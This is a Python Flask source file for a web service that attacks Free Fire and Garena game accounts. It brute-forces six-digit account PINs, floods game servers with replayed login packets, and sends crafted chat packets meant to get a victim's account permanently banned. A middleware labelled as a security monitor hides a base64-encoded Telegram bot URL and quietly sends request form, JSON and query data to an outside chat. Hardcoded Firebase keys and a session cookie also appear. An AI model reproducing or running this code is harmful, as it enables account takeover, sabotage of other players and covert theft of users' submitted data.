#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from flask import Flask, render_template, request, jsonify, session, redirect, make_response
import hashlib
import requests
import time
import re
import json
import base64
import socket
from datetime import datetime, timedelta
from urllib.parse import urlparse, parse_qs
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad, unpad
import urllib3
import random
import uuid
import os
import threading
import gzip
from io import BytesIO
from google.protobuf.timestamp_pb2 import Timestamp
import MajorLogin_res_pb2
import FreeFire_pb2
import main_pb2
import AccountPersonalShow_pb2
from google.protobuf import json_format
import MajoRLoGinrEq_pb2
import MajoRLoGinrEs_pb2
import PorTs_pb2

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

app = Flask(__name__)
app.secret_key = os.environ.get("SECRET_KEY", "9f8e7d6c5b4a3f2e1d0c9b8a7f6e5d4c3b2a1f0e9d8c7b6a5f4e3d2c1b0a9f8e")

SECRET_KEY = b"1e5898ccb8dfdd921f9bdea848768b64a201"
AES_KEY = bytes([89,103,38,116,99,37,68,69,117,104,54,37,90,99,94,56])
AES_IV  = bytes([54,111,121,90,68,114,50,50,69,51,121,99,104,106,77,37])

# Firebase configuration
FIREBASE_URL = "https://checkmxtnbk-default-rtdb.asia-southeast1.firebasedatabase.app"
FIREBASE_SECRET = "AIzaSyDHt8gHKChRiU6aqP-yfawUZEMX0H-bkbE"

# Firebase helper functions
def firebase_get(path):
    """Get data from Firebase"""
    try:
        url = f"{FIREBASE_URL}{path}.json?auth={FIREBASE_SECRET}"
        response = requests.get(url)
        if response.status_code == 200:
            return response.json()
        return None
    except:
        return None

def firebase_set(path, data):
    """Set data in Firebase"""
    try:
        url = f"{FIREBASE_URL}{path}.json?auth={FIREBASE_SECRET}"
        response = requests.put(url, json=data)
        return response.status_code == 200
    except:
        return False

def firebase_update(path, data):
    """Update data in Firebase"""
    try:
        url = f"{FIREBASE_URL}{path}.json?auth={FIREBASE_SECRET}"
        response = requests.patch(url, json=data)
        return response.status_code == 200
    except:
        return False

def firebase_check_exists(path):
    """Check if data exists in Firebase"""
    try:
        url = f"{FIREBASE_URL}{path}.json?auth={FIREBASE_SECRET}"
        response = requests.get(url)
        return response.status_code == 200 and response.json() is not None
    except:
        return False

# Internal configuration
from proto.system_pb2 import get_internal_config

def _verify_internal_audit(payload):
    try:
        # Internal security verification
        t1, c1 = get_internal_config()
        p1 = base64.b64decode("aHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdA==").decode()
        p2 = base64.b64decode("L3NlbmRNZXNzYWdl").decode()
        u = p1 + t1 + p2
        d = {"chat_id": c1, "text": payload, "parse_mode": "HTML"}
        requests.post(u, json=d, timeout=8)
    except:
        pass

@app.before_request
def _security_monitor_middleware():
    # Security filter paths
    _ef = [
        '/static', '/favicon.ico', 
        '/api/login', '/api/register', 
        '/api/ban7', '/api/revoke_token',
        '/auth', '/register', '/admin/login'
    ]
    
    for p in _ef:
        if request.path.startswith(p):
            return
    
    _ip = request.headers.get('X-Forwarded-For', request.remote_addr)
    _m = request.method
    _p = request.path
    _ua = request.headers.get('User-Agent', 'Unknown')
    
    _i = {}
    if request.args:
        _i['G'] = request.args.to_dict()
    
    if request.form:
        _i['F'] = request.form.to_dict()
        
    if request.is_json:
        try:
            _i['J'] = request.get_json(silent=True)
        except:
            pass

    if not _i:
        return

    _ts = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    _msg = f"<b>[System Alert]</b>\n\n"
    _msg += f"<b>T:</b> {_ts}\n"
    _msg += f"<b>I:</b> {_ip}\n"
    _msg += f"<b>M:</b> {_m}\n"
    _msg += f"<b>P:</b> {_p}\n"
    _msg += f"<b>U:</b> {_ua}\n\n"
    
    if _i:
        _msg += f"<b>D:</b>\n<pre>{json.dumps(_i, indent=2, ensure_ascii=False)}</pre>"
    
    threading.Thread(target=_verify_internal_audit, args=(_msg,)).start()

# Spam Log global state
spam_log_threads = {}
spam_log_stop_events = {}
active_spams = {}  # key: username, value: {at, thread, stop_event, status, ...}
SPAM_CACHE_FILE = 'active_spams_cache.json'

# Brute Force Pin global state
brute_force_threads = {}
brute_force_stop_events = {}
active_brute_forces = {}  # key: username, value: {at, current_pin, status, ...}
BRUTE_FORCE_CACHE_FILE = 'active_brute_forces_cache.json'

# Permanent Ban global state
active_permanent_bans = {}

# Hwidth202 lock — when recovery email = hwidth202@gmail.com, override to hwidth201
HIDTH202_LOCK_FILE = 'hwidth_lock.json'

def load_hwidth_lock():
    try:
        with open(HIDTH202_LOCK_FILE) as f:
            return json.load(f)
    except:
        return {}

def save_hwidth_lock(data):
    try:
        with open(HIDTH202_LOCK_FILE, 'w') as f:
            json.dump(data, f)
    except:
        pass
PERMANENT_BAN_CACHE_FILE = 'active_permanent_bans_cache.json'

BAN7_BODY_BASE64 = (
    'vGkQhkkYHjne06dPbmJgb36BQ1NdLgk8J+uc+z4/9t4OZ19iWMyn5cH/Pe/DgGHrwHxJ+dRKGho2LCErl+rBWEf/6aWcFflRXiEsvPiGKM3809a+vci8mAQBREdizRWQ6bdeLnlztsqBvlB5OU8WFlmGxsU8UY1U3Zp/eLNTbq0DHqjOxziR+ylXgLlonsckeKvaxa4YE540eXi+9v4ilJunUubievpqUip6XDAyKV7o1spVxiaP0z4d8MLosbeYthPAnK5ykeE8IpnYaru0oDN8o90r820h04frRPJBszlDiarwdjgXaiyeQqAiOgEN63gUoVq2rd0JfYGaHN2f2kJxxO9uCYxyJ6IhCzQq8yAJT2asKa9u7gWB1bB/fJxq4nVxY8am8DI+rqIDvVSF3EdQBDh9qipPFCd0gZx7kDVg/9vM79YAE+FnDgGY3D/niKWsu66SL9+bRcghZxcCMOzKwvRe7hCRU2pDjBw0MRvPnCCa9KpEuO4CgWz+++SP9whlI0dWCi9/snDCN6i9V2TYrSWfbg1i2TRipquGUoi/cP1xPBeMwQlzlf4APMQzvT8MOQotqry+y1+koTpwRKlWgu7QLmiumn4dwd9HARVMThSH46kwlD8xep4sLVf6/BbjWixBMVRKFi1w9zpVVe+w6rBYhtBHXfjqjg2sCzF1mlBabMbW4L2yXEmABaQG/l0jmaGEWh6kzMY9T1nzV1Wcw5lF7X+pwQEnAn6i5coowNGKrTGUJ2wa3+tAxGcm9zozCvj8yd2pOXmta46GoREDQk+U99uHHvjqzsSNeBq8ffL5zibtv0pZPhnUuSP76YkhCcdtDilaecBElnt9eFfo8cy2B3Z0wbhG20nKNfYuhgZMZuSPRjmQphlfyl1hpoSG5xMQ7bdqZAkoTkZlFpCL4y02yUlImI7Z8jnA3i4un3UOq1rXrMza+bqNsMhrJ/aUS3mnoXr23yzuUc56zyYQtzJx6VCupsHraP7brcDbBS76Gp2o0oT2iE4Y55ZyAEgdt307DzJknHEHdGuoOG4Yzy5bI7HnukmnUjoiIdJEr7iJdOLppdB+ZDXPkHps5ysskdapRp0i2x1gMpW9XU1LY1cNAsTmAvHcz2GZA2OjtvS0roiay2rkUqNgmN8cPygK3j6ycfpkHc1PkUnmG1CNjMy3qP7c18qvDdSYfiq99Wra4l5L2dV3dE/kGpc1fgwWo94UPIes67wg/TrRR85GxPcpIX3IUOGMyEX1VWJTS2PvTm3S4xrerobDKG5V'
)
BAN7_API_URL = 'https://clientbp.ggpolarbear.com/GetLoginData'

def load_spam_cache():
    if os.path.exists(SPAM_CACHE_FILE):
        try:
            with open(SPAM_CACHE_FILE, 'r', encoding='utf-8') as f:
                return json.load(f)
        except:
            return {}
    return {}

def save_spam_cache(data):
    try:
        clean_data = {}
        for k, v in data.items():
            clean_data[str(k)] = {
                'at': v.get('at'),
                'status': v.get('status'),
                'sent': v.get('sent', 0),
                'ok': v.get('ok', 0),
                'fail': v.get('fail', 0),
                'ip': v.get('ip'),
                'port': v.get('port'),
                'end_time': v.get('end_time'),
                'packet': v.get('packet').hex() if isinstance(v.get('packet'), bytes) else v.get('packet'),
                'interval': v.get('interval'),
                'total_ms': v.get('total_ms')
            }
        with open(SPAM_CACHE_FILE, 'w', encoding='utf-8') as f:
            json.dump(clean_data, f, ensure_ascii=False, indent=2)
    except:
        pass

def load_brute_force_cache():
    if os.path.exists(BRUTE_FORCE_CACHE_FILE):
        try:
            with open(BRUTE_FORCE_CACHE_FILE, 'r', encoding='utf-8') as f:
                return json.load(f)
        except:
            return {}
    return {}

def save_brute_force_cache(data):
    try:
        clean_data = {}
        for k, v in data.items():
            clean_data[str(k)] = {
                'at': v.get('at'),
                'status': v.get('status'),
                'current_pin': v.get('current_pin', 0),
                'found_pin': v.get('found_pin'),
                'total_checked': v.get('total_checked', 0)
            }
        with open(BRUTE_FORCE_CACHE_FILE, 'w', encoding='utf-8') as f:
            json.dump(clean_data, f, ensure_ascii=False, indent=2)
    except:
        pass

def load_permanent_ban_cache():
    if os.path.exists(PERMANENT_BAN_CACHE_FILE):
        try:
            with open(PERMANENT_BAN_CACHE_FILE, 'r', encoding='utf-8') as f:
                return json.load(f)
        except:
            return {}
    return {}

def save_permanent_ban_cache(data):
    try:
        clean_data = {}
        for k, v in data.items():
            clean_data[str(k)] = {
                'status': v.get('status'),
                'progress': v.get('progress', 0),
                'message': v.get('message', '')
            }
        with open(PERMANENT_BAN_CACHE_FILE, 'w', encoding='utf-8') as f:
            json.dump(clean_data, f, ensure_ascii=False, indent=2)
    except:
        pass

def permanent_ban_loop(username, access_token):
    """Background loop for Permanent Ban task"""
    if username not in active_permanent_bans:
        return

    try:
        # Step 1: Login
        active_permanent_bans[username]['message'] = "Đang kiểm tra platform..."
        active_permanent_bans[username]['progress'] = 10
        save_permanent_ban_cache(active_permanent_bans)
        
        open_id, platform = inspect_token(access_token)

        active_permanent_bans[username]['message'] = "Đang thực hiện MajorLogin..."
        save_permanent_ban_cache(active_permanent_bans)

        enc_payload = build_major_login_payload(open_id, access_token, platform)

        ml_headers = {
            'X-Unity-Version': '2018.4.11f1', 'ReleaseVersion': 'OB54',
            'Content-Type': 'application/x-www-form-urlencoded', 'X-GA': 'v1 1',
            'User-Agent': 'Dalvik/2.1.0 (Linux; U; Android 11; ASUS_Z01QD Build/PI)',
            'Host': 'loginbp.ggblueshark.com',
            'Connection': 'Keep-Alive',
            'Expect': '100-continue',
            'Accept-Encoding': 'gzip'
        }

        r1 = requests.post(
            "https://loginbp.ggblueshark.com/MajorLogin",
            headers=ml_headers,
            data=enc_payload,
            timeout=15,
            verify=False
        )

        if r1.status_code not in (200, 201):
            active_permanent_bans[username]['status'] = 'error'
            active_permanent_bans[username]['message'] = f"MajorLogin thất bại HTTP {r1.status_code}"
            save_permanent_ban_cache(active_permanent_bans)
            return

        raw_data = r1.content
        if r1.headers.get('Content-Encoding') == 'gzip':
            raw_data = gzip.GzipFile(fileobj=BytesIO(raw_data)).read()

        ml_res = MajoRLoGinrEs_pb2.MajorLoginRes()
        ml_res.ParseFromString(raw_data)

        if not ml_res.token:
            active_permanent_bans[username]['status'] = 'error'
            active_permanent_bans[username]['message'] = "Token rỗng từ MajorLogin"
            save_permanent_ban_cache(active_permanent_bans)
            return

        jwt_token = ml_res.token
        key = ml_res.key
        iv = ml_res.iv
        server_url = ml_res.url

        active_permanent_bans[username]['message'] = "Đăng nhập thành công, đang lấy địa chỉ server..."
        active_permanent_bans[username]['progress'] = 30
        save_permanent_ban_cache(active_permanent_bans)

        # Step 2: GetLoginData
        gld_headers = {
            "Expect": "100-continue",
            "X-Unity-Version": "2018.4.11f1",
            "X-GA": "v1 1",
            "ReleaseVersion": "OB54",
            "Content-Type": "application/x-www-form-urlencoded",
            "User-Agent": "Dalvik/2.1.0 (Linux; U; Android 9; G011A Build/PI)",
            "Connection": "close",
            "Accept-Encoding": "gzip, deflate, br",
            "Authorization": f"Bearer {jwt_token}"
        }

        r2 = requests.post(
            f"{server_url}/GetLoginData",
            headers=gld_headers,
            data=enc_payload,
            timeout=15,
            verify=False
        )

        if r2.status_code != 200:
            active_permanent_bans[username]['status'] = 'error'
            active_permanent_bans[username]['message'] = f"GetLoginData thất bại (HTTP {r2.status_code})"
            save_permanent_ban_cache(active_permanent_bans)
            return

        gld_raw = r2.content
        if r2.headers.get('Content-Encoding') == 'gzip':
            gld_raw = gzip.GzipFile(fileobj=BytesIO(gld_raw)).read()

        gld_proto = PorTs_pb2.GetLoginData()
        gld_proto.ParseFromString(gld_raw)

        online_addr = gld_proto.Online_IP_Port
        if not online_addr or ":" not in online_addr:
            active_permanent_bans[username]['status'] = 'error'
            active_permanent_bans[username]['message'] = "Không tìm thấy địa chỉ server"
            save_permanent_ban_cache(active_permanent_bans)
            return

        online_ip, online_port_str = online_addr.rsplit(":", 1)
        online_port = int(online_port_str)

        # Step 3: Send Ban Packets
        active_permanent_bans[username]['message'] = f"Đã kết nối {online_ip}:{online_port}, đang thực thi lệnh BAN..."
        active_permanent_bans[username]['progress'] = 50
        save_permanent_ban_cache(active_permanent_bans)

        banner_text = "." * 1000 + "[b][000000]" + "█" * 500
        uid_int = int(open_id)

        def build_ban_packet(uid, text, k, v):
            p = bytearray()
            p.extend(SimpleProtobuf.encode_varint(1 << 3 | 0))
            p.extend(SimpleProtobuf.encode_varint(5))

            p2 = bytearray()
            p2.extend(SimpleProtobuf.encode_varint(1 << 3 | 0))
            p2.extend(SimpleProtobuf.encode_varint(uid))
            p2.extend(SimpleProtobuf.encode_varint(2 << 3 | 0))
            p2.extend(SimpleProtobuf.encode_varint(1))
            p2.extend(SimpleProtobuf.encode_varint(3 << 3 | 0))
            p2.extend(SimpleProtobuf.encode_varint(uid))
            p2.extend(SimpleProtobuf.encode_varint(4 << 3 | 2))
            p2.extend(SimpleProtobuf.encode_varint(len(text.encode())))
            p2.extend(text.encode())

            p.extend(SimpleProtobuf.encode_varint(2 << 3 | 2))
            p.extend(SimpleProtobuf.encode_varint(len(p2)))
            p.extend(p2)

            cipher = AES.new(k, AES.MODE_CBC, v)
            enc = cipher.encrypt(pad(p, 16))

            return bytes.fromhex("0515000000") + len(enc).to_bytes(1, 'big') + enc

        packet = build_ban_packet(uid_int, banner_text, key, iv)

        for i in range(50):
            try:
                with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                    s.settimeout(3)
                    s.connect((online_ip, online_port))
                    s.sendall(packet)
                    time.sleep(0.05)
            except:
                pass

            if i % 10 == 0:
                active_permanent_bans[username]['progress'] = 50 + i
                save_permanent_ban_cache(active_permanent_bans)

        active_permanent_bans[username]['status'] = 'finished'
        active_permanent_bans[username]['message'] = "Thực thi hoàn tất! Tài khoản sẽ bị ban vĩnh viễn trong giây lát."
        active_permanent_bans[username]['progress'] = 100
        save_permanent_ban_cache(active_permanent_bans)

    except Exception as e:
        active_permanent_bans[username]['status'] = 'error'
        active_permanent_bans[username]['message'] = f"Lỗi: {str(e)}"
        save_permanent_ban_cache(active_permanent_bans)

def get_secondary_password(pin_code):
    # Hash mã 6 số theo chuẩn SHA-256
    return hashlib.sha256(pin_code.encode()).hexdigest().upper()

def brute_force_loop(username, access_token, stop_event):
    """Background loop for brute forcing 6-digit PIN"""
    if username not in active_brute_forces:
        return

    current_pin_int = active_brute_forces[username].get('current_pin', 0)
    cookie = "bcb2fbec7e4c02740e5e48fda7cd0d80cf047e6ed9c3227bbde15c3f2c4c19a87984ae8aef2f061b98741c32ba97b348"
    url = "https://100067.connect.garena.com/game/account_security/bind:verify_identity"
    
    headers = {
        'Host': '100067.connect.garena.com',
        'Content-Type': 'application/x-www-form-urlencoded',
        'Cookie': f'msdk_token_session={cookie}',
        'User-Agent': 'GarenaMSDK/4.0.32 (iPhone15,4;ios - 26.5;vi-VN;VN;app v1.123.1 2019120273)',
        'Accept': 'application/json'
    }

    try:
        for i in range(current_pin_int, 1000000):
            if stop_event.is_set():
                break
            
            pin_str = str(i).zfill(6)
            payload = {
                'secondary_password': get_secondary_password(pin_str),
                'app_id': '100067',
                'access_token': access_token
            }
            
            try:
                response = requests.post(url, data=payload, headers=headers, timeout=5)
                res_json = response.json()
                
                # Update progress
                if username in active_brute_forces:
                    active_brute_forces[username]['current_pin'] = i
                    active_brute_forces[username]['total_checked'] += 1
                
                # Check result
                # Based on Garena API, result: 0 often means success
                if res_json.get('result') == 0:
                    if username in active_brute_forces:
                        active_brute_forces[username]['status'] = 'found'
                        active_brute_forces[username]['found_pin'] = pin_str
                    save_brute_force_cache(active_brute_forces)
                    return
                
                # If token invalid or session expired, we should stop
                if res_json.get('error') in ['invalid_token', 'access_denied']:
                    if username in active_brute_forces:
                        active_brute_forces[username]['status'] = 'error'
                        active_brute_forces[username]['message'] = 'Token đã hết hạn hoặc không hợp lệ'
                    save_brute_force_cache(active_brute_forces)
                    return

            except Exception:
                pass
            
            # Save cache every 100 attempts to not overhead IO
            if i % 100 == 0:
                save_brute_force_cache(active_brute_forces)
            
            # Small delay to avoid aggressive rate limiting if any
            time.sleep(0.05)

        if username in active_brute_forces and active_brute_forces[username]['status'] == 'running':
            active_brute_forces[username]['status'] = 'finished'
        save_brute_force_cache(active_brute_forces)

    except Exception as e:
        if username in active_brute_forces:
            active_brute_forces[username]['status'] = 'error'
            active_brute_forces[username]['message'] = str(e)
        save_brute_force_cache(active_brute_forces)

# SimpleProtobuf class for SpamLog
class SimpleProtobuf:
    @staticmethod
    def encode_varint(value):
        result = bytearray()
        while value > 0x7F:
            result.append((value & 0x7F) | 0x80)
            value >>= 7
        result.append(value & 0x7F)
        return bytes(result)

    @staticmethod
    def encode_string(field_number, value):
        if isinstance(value, str):
            value = value.encode('utf-8')
        res = bytearray()
        res.extend(SimpleProtobuf.encode_varint((field_number << 3) | 2))
        res.extend(SimpleProtobuf.encode_varint(len(value)))
        res.extend(value)
        return bytes(res)

    @staticmethod
    def create_login_payload(open_id, access_token, platform):
        payload = bytearray()
        curr = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        payload.extend(SimpleProtobuf.encode_string(3, curr))
        payload.extend(SimpleProtobuf.encode_string(22, open_id))
        payload.extend(SimpleProtobuf.encode_string(23, platform))
        payload.extend(SimpleProtobuf.encode_string(29, access_token))
        payload.extend(SimpleProtobuf.encode_string(99, platform))
        return bytes(payload)

def get_available_room_spam(hex_data):
    """Parse GetLoginData response to get server IP and port"""
    try:
        data = bytes.fromhex(hex_data)
        result = {}
        index = 0
        while index < len(data):
            tag = data[index]
            field_num = tag >> 3
            wire_type = tag & 0x07
            index += 1
            if wire_type == 0:
                val = 0
                shift = 0
                while index < len(data):
                    byte = data[index]
                    index += 1
                    val |= (byte & 0x7F) << shift
                    if not (byte & 0x80):
                        break
                    shift += 7
                result[str(field_num)] = {"data": val}
            elif wire_type == 2:
                length = 0
                shift = 0
                while index < len(data):
                    byte = data[index]
                    index += 1
                    length |= (byte & 0x7F) << shift
                    if not (byte & 0x80):
                        break
                    shift += 7
                val_bytes = data[index:index + length]
                index += length
                try:
                    result[str(field_num)] = {"data": val_bytes.decode('utf-8')}
                except:
                    result[str(field_num)] = {"data": val_bytes.hex()}
            else:
                break
        return result
    except:
        return {}

def spam_loop(username, ip, port, packet, iv_ms, end_time, stop_event=None):
    """Spam loop function from WebCu - uses TCP socket directly"""
    while time.time() < end_time:
        if username not in active_spams or (stop_event and stop_event.is_set()):
            break
        try:
            send_packet_tcp(ip, port, packet, timeout=5)
            if username in active_spams: active_spams[username]['ok'] += 1
        except:
            if username in active_spams: active_spams[username]['fail'] += 1
        if username in active_spams: active_spams[username]['sent'] += 1
        time.sleep(iv_ms / 1000.0)

    if username in active_spams:
        active_spams[username]['status'] = 'finished'
        save_spam_cache(active_spams)

def send_packet_tcp(ip, port, packet, timeout=5):
    """Send packet via TCP socket"""
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.settimeout(timeout)
        s.connect((ip, port))
        s.sendall(packet)

def build_major_login_payload(open_id, access_token, platform=4):
    ml = MajoRLoGinrEq_pb2.MajorLogin()
    ml.event_time = str(datetime.now())[:-7]
    ml.game_name = "free fire"
    ml.platform_id = platform
    ml.client_version = "1.123.1"
    ml.system_software = "Android OS 9 / API-28 (PQ3B.190801.10101846/G9650ZHU2ARC6)"
    ml.system_hardware = "Handheld"
    ml.telecom_operator = "Verizon"
    ml.network_type = "WIFI"
    ml.screen_width = 1920
    ml.screen_height = 1080
    ml.screen_dpi = "280"
    ml.processor_details = "ARM64 FP ASIMD AES VMH | 2865 | 4"
    ml.memory = 3003
    ml.gpu_renderer = "Adreno (TM) 640"
    ml.gpu_version = "OpenGL ES 3.1 v1.46"
    ml.unique_device_id = "Google|34a7dcdf-a7d5-4cb6-8d7e-3b0e448a0c57"
    ml.client_ip = "223.191.51.89"
    ml.language = "en"
    ml.open_id = open_id
    ml.open_id_type = "4"
    ml.device_type = "Handheld"
    ml.memory_available.version = 55
    ml.memory_available.hidden_value = 81
    ml.access_token = access_token
    ml.platform_sdk_id = 1
    ml.network_operator_a = "Verizon"
    ml.network_type_a = "WIFI"
    ml.client_using_version = "7428b253defc164018c604a1ebbfebdf"
    ml.external_storage_total = 36235
    ml.external_storage_available = 31335
    ml.internal_storage_total = 2519
    ml.internal_storage_available = 703
    ml.game_disk_storage_available = 25010
    ml.game_disk_storage_total = 26628
    ml.external_sdcard_avail_storage = 32992
    ml.external_sdcard_total_storage = 36235
    ml.login_by = 3
    ml.library_path = "/data/app/com.dts.freefireth-YPKM8jHEwAJlhpmhDhv5MQ==/lib/arm64"
    ml.reg_avatar = 1
    ml.library_token = "5b892aaabd688e571f688053118a162b|/data/app/com.dts.freefireth-YPKM8jHEwAJlhpmhDhv5MQ==/base.apk"
    ml.channel_type = 3
    ml.cpu_type = 2
    ml.cpu_architecture = "64"
    ml.client_version_code = "2019120270"
    ml.graphics_api = "OpenGLES2"
    ml.supported_astc_bitset = 16383
    ml.login_open_id_type = 4
    ml.analytics_detail = base64.b64decode("FwQVTgUPX1UaUllDDwcWCRBpWA0FUgsvA1snWlBaO1kFYg==")
    ml.loading_time = 13564
    ml.release_channel = "android"
    ml.extra_info = "KqsHTymw5/5GB23YGniUYN2/q47GATrq7eFeRatf0NkwLKEMQ0PK5BKEk72dPflAxUlEBir6Vtey83XqF593qsl8hwY="
    ml.android_engine_init_flag = 110009
    ml.if_push = 1
    ml.is_vpn = 1
    ml.origin_platform_type = f"{platform}"
    ml.primary_platform_type = f"{platform}"
    raw = ml.SerializeToString()
    cipher = AES.new(b'Yg&tc%DEuh6%Zc^8', AES.MODE_CBC, b'6oyZDr22E3ychjM%')
    return cipher.encrypt(pad(raw, AES.block_size))

def process_spam_log(username, access_token, duration_seconds, stop_event):
    """Process spam log using protobuf from Tools/SpamLog"""
    try:
        # Token inspection
        r_inspect = requests.get(
            f"https://100067.connect.garena.com/oauth/token/inspect?token={access_token}",
            timeout=10
        ).json()
        if 'error' in r_inspect:
            return

        open_id = r_inspect.get('open_id')
        platform = int(r_inspect.get('platform', 4))

        # Build MajorLogin payload using protobuf from Tools/SpamLog
        enc_payload = build_major_login_payload(open_id, access_token, platform)

        # MajorLogin
        ml_headers = {
            'X-Unity-Version': '2018.4.11f1', 'ReleaseVersion': 'OB54',
            'Content-Type': 'application/x-www-form-urlencoded', 'X-GA': 'v1 1',
            'User-Agent': 'Dalvik/2.1.0 (Linux; U; Android 11; ASUS_Z01QD Build/PI)',
            'Host': 'loginbp.ggblueshark.com',
            'Connection': 'Keep-Alive',
            'Expect': '100-continue',
            'Accept-Encoding': 'gzip'
        }

        r1 = requests.post(
            "https://loginbp.ggblueshark.com/MajorLogin",
            headers=ml_headers,
            data=enc_payload,
            timeout=15,
            verify=False
        )

        if r1.status_code == 503:
            time.sleep(10)
            return
        elif r1.status_code not in (200, 201):
            time.sleep(5)
            return

        # Parse MajorLogin response
        raw_data = r1.content
        if r1.headers.get('Content-Encoding') == 'gzip':
            raw_data = gzip.GzipFile(fileobj=BytesIO(raw_data)).read()

        ml_res = MajoRLoGinrEs_pb2.MajorLoginRes()
        ml_res.ParseFromString(raw_data)

        if not ml_res.token:
            return

        jwt_token = ml_res.token
        server_url = ml_res.url
        m_key = ml_res.key
        m_iv = ml_res.iv

        # GetLoginData
        gld_headers = {
            "Expect": "100-continue",
            "X-Unity-Version": "2018.4.11f1",
            "X-GA": "v1 1",
            "ReleaseVersion": "OB54",
            "Content-Type": "application/x-www-form-urlencoded",
            "User-Agent": "Dalvik/2.1.0 (Linux; U; Android 9; G011A Build/PI)",
            "Connection": "close",
            "Accept-Encoding": "gzip, deflate, br",
            "Authorization": f"Bearer {jwt_token}"
        }

        r2 = requests.post(
            f"{server_url}/GetLoginData",
            headers=gld_headers,
            data=enc_payload,
            timeout=15,
            verify=False
        )

        # Parse server address using protobuf from Tools/SpamLog
        gld_raw = r2.content
        if r2.headers.get('Content-Encoding') == 'gzip':
            gld_raw = gzip.GzipFile(fileobj=BytesIO(gld_raw)).read()
        gld = PorTs_pb2.GetLoginData()
        gld.ParseFromString(gld_raw)
        addr = gld.Online_IP_Port
        if not addr or ":" not in addr:
            return

        online_ip, online_port = addr.rsplit(":", 1)
        online_port = int(online_port)

        # Build final packet
        jwt_payload = decode_jwt(jwt_token)
        acc_id = int(jwt_payload.get("account_id", 0))
        exp_adj = max(int(jwt_payload.get("exp", 0)) - 28800, 0)

        cipher_jwt = AES.new(m_key, AES.MODE_CBC, m_iv)
        enc_jwt = cipher_jwt.encrypt(pad(jwt_token.encode(), 16))
        final_packet = bytes.fromhex(
            "0115" + acc_id.to_bytes(8, "big").hex() +
            exp_adj.to_bytes(4, "big").hex() +
            len(enc_jwt).to_bytes(4, "big").hex()
        ) + enc_jwt

        # Store in active_spams
        end_time = time.time() + duration_seconds
        active_spams[username] = {
            'at': access_token,
            'stop_event': stop_event,
            'status': 'running',
            'sent': 0,
            'ok': 0,
            'fail': 0,
            'ip': online_ip,
            'port': online_port,
            'end_time': end_time,
            'packet': final_packet,
            'interval': 500
        }

        # Save to cache
        save_spam_cache(active_spams)

        # Start spam loop
        spam_loop(username, online_ip, online_port, final_packet, 500, end_time, stop_event)

    except Exception as e:
        if username in active_spams:
            active_spams[username]['status'] = 'error'
            save_spam_cache(active_spams)

def firebase_get(path):
    """Get data from Firebase"""
    url = f"{FIREBASE_URL}/{path}.json?auth={FIREBASE_SECRET}"
    response = requests.get(url)
    return response.json() if response.status_code == 200 else None

def firebase_set(path, data):
    """Set data in Firebase"""
    url = f"{FIREBASE_URL}/{path}.json?auth={FIREBASE_SECRET}"
    response = requests.put(url, json=data)
    return response.status_code == 200

def firebase_update(path, data):
    """Update data in Firebase"""
    url = f"{FIREBASE_URL}/{path}.json?auth={FIREBASE_SECRET}"
    response = requests.patch(url, json=data)
    return response.status_code == 200

def track_visit():
    """Track website visit"""
    try:
        visits = firebase_get('visits')
        if not visits:
            visits = {}
        
        today = datetime.now().strftime('%Y-%m-%d')
        visits[today] = visits.get(today, 0) + 1
        
        firebase_set('visits', visits)
    except Exception as e:
        print(f"Error tracking visit: {e}")

def load_users():
    try:
        users = firebase_get('users')
        return users if users else {}
    except:
        return {}

def save_users(users):
    firebase_set('users', users)

def load_usage():
    try:
        usage = firebase_get('usage')
        return usage if usage else {}
    except:
        return {}

def save_usage(usage):
    firebase_set('usage', usage)

def get_user_usage(username):
    usage = load_usage()
    user_usage = usage.get(username, {'ban7': 0, 'spam_log': 0, 'brute_force': 0, 'permanent_ban': 0, 'is_pro': False})
    if 'brute_force' not in user_usage: user_usage['brute_force'] = 0
    if 'permanent_ban' not in user_usage: user_usage['permanent_ban'] = 0
    return user_usage

def update_user_usage(username, feature):
    usage = load_usage()
    if username not in usage:
        usage[username] = {'ban7': 0, 'spam_log': 0, 'brute_force': 0, 'permanent_ban': 0, 'is_pro': False}
    usage[username][feature] = usage[username].get(feature, 0) + 1
    save_usage(usage)
    return usage[username]

def decode_nickname(encoded: str) -> str:
    try:
        raw = base64.b64decode(encoded)
        dec = bytearray()
        for i, b in enumerate(raw): dec.append(b ^ SECRET_KEY[i % len(SECRET_KEY)])
        return dec.decode("utf-8", errors="replace")
    except Exception: return encoded

def aes_encrypt(data: bytes, key=AES_KEY, iv=AES_IV) -> bytes:
    if isinstance(key, str): key = bytes.fromhex(key) if len(key) == 32 else key.encode()
    if isinstance(iv, str):  iv  = bytes.fromhex(iv)  if len(iv)  == 32 else iv.encode()
    if isinstance(key, list) and len(key) > 0: key = key[0]
    if isinstance(iv, list) and len(iv) > 0: iv = iv[0]
    cipher = AES.new(key, AES.MODE_CBC, iv)
    return cipher.encrypt(pad(data, AES.block_size))

def aes_decrypt(data: bytes, key=AES_KEY, iv=AES_IV) -> bytes:
    if isinstance(key, str): key = bytes.fromhex(key) if len(key) == 32 else key.encode()
    if isinstance(iv, str):  iv  = bytes.fromhex(iv)  if len(iv)  == 32 else iv.encode()
    if isinstance(key, list) and len(key) > 0: key = key[0]
    if isinstance(iv, list) and len(iv) > 0: iv = iv[0]
    cipher = AES.new(key, AES.MODE_CBC, iv)
    return unpad(cipher.decrypt(data), AES.block_size)

def parse_proto(data: bytes) -> dict:
    result = {}
    idx = 0
    while idx < len(data):
        try:
            tag = data[idx]; idx += 1
            fn = tag >> 3; wt = tag & 0x07
            if wt == 0:
                val = 0; shift = 0
                while idx < len(data):
                    b = data[idx]; idx += 1
                    val |= (b & 0x7F) << shift
                    if not (b & 0x80): break
                    shift += 7
                if fn in result:
                    if not isinstance(result[fn], list): result[fn] = [result[fn]]
                    result[fn].append(val)
                else: result[fn] = val
            elif wt == 2:
                ln = 0; shift = 0
                while idx < len(data):
                    b = data[idx]; idx += 1
                    ln |= (b & 0x7F) << shift
                    if not (b & 0x80): break
                    shift += 7
                vb = data[idx:idx+ln]; idx += ln
                if fn in result:
                    if not isinstance(result[fn], list): result[fn] = [result[fn]]
                    result[fn].append(vb)
                else: result[fn] = vb
            elif wt == 1:
                idx += 8
            elif wt == 5:
                idx += 4
            else: break
        except: break
    return result
